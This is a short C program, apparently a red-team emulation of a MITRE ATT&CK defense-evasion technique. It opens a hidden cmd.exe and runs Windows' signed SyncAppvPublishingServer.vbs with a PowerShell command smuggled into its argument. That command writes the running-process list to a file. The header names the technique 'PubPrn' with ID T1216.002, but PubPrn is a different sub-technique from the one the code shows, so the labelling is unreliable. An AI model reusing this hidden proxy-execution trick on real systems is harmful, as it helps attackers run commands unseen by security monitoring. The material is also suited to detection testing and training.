// Link      = https://attack.mitre.org/techniques/T1216/002/
// Technique = System Script Proxy Execution: PubPrn
// ID        = T1216.002
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("wscript.exe C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n; Get-Process | Out-File C:\\Temp\\process_list.txt\"");
    return 0;
}